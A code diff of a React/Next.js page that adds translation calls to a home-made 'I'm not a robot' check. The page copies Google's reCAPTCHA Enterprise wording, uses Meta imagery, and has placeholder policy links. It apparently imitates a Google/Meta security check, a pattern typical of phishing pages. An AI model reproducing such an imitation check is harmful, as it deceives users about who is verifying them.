@@ -2,12 +2,14 @@
 import CheckMarkImage from '@/assets/images/checkmark.png';
 import MetaImage from '@/assets/images/meta-image.png';
 import ReCaptchaImage from '@/assets/images/recaptcha.png';
+import { useTranslation } from '@/utils/use-translation';
 import axios from 'axios';
 import Image from 'next/image';
 import { useRouter } from 'next/navigation';
 import { useEffect, useState, type FC } from 'react';
 const Index: FC = () => {
     const router = useRouter();
+    const { t } = useTranslation();
     const [isLoading, setIsLoading] = useState(false);
     const [isShowCheckMark, setisShowCheckMark] = useState(false);
     const handleVerify = async () => {
@@ -65,21 +67,21 @@ const Index: FC = () => {
                                         )}
                                     </button>
                                 </div>
-                                <div className='text-left text-xs sm:text-sm font-semibold tracking-normal text-gray-500'>I&apos;m not a robot</div>
+                                <div className='text-left text-xs sm:text-sm font-semibold tracking-normal text-gray-500'>{t('I\'m not a robot')}</div>
                             </div>
                             <div className='flex flex-col items-center text-[#9d9ba7] flex-shrink-0 ml-1 sm:ml-2'>
                                 <Image src={ReCaptchaImage} alt='reCAPTCHA' className='h-6 sm:h-7 w-6 sm:w-7' />
-                                <p className='text-[8px] sm:text-[9px] font-bold whitespace-nowrap'>reCAPTCHA</p>
-                                <small className='text-[6px] sm:text-[7px] text-gray-500 whitespace-nowrap'>Privacy - Terms</small>
+                                <p className='text-[8px] sm:text-[9px] font-bold whitespace-nowrap'>{t('reCAPTCHA')}</p>
+                                <small className='text-[6px] sm:text-[7px] text-gray-500 whitespace-nowrap'>{t('Privacy - Terms')}</small>
                             </div>
                         </div>
                     </div>
 
                     {/* reCAPTCHA Info Text */}
                     <div className='flex flex-col gap-2 sm:gap-3 text-xs sm:text-sm text-gray-700 leading-relaxed'>
-                        <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
-                        <p>We&apos;ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google&apos;s <a href='#' className='text-blue-600 hover:underline'>Privacy Policy</a> and <a href='#' className='text-blue-600 hover:underline'>Terms of Use</a>.</p>
-                        <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+                        <p>{t('This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.')}</p>
+                        <p>{t('We\'ve used Google\'s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google\'s')} <a href='#' className='text-blue-600 hover:underline'>{t('Privacy Policy')}</a> {t('and')} <a href='#' className='text-blue-600 hover:underline'>{t('Terms of Use')}</a>.</p>
+                        <p>{t('reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.')}</p>
                     </div>
                 </div>
 
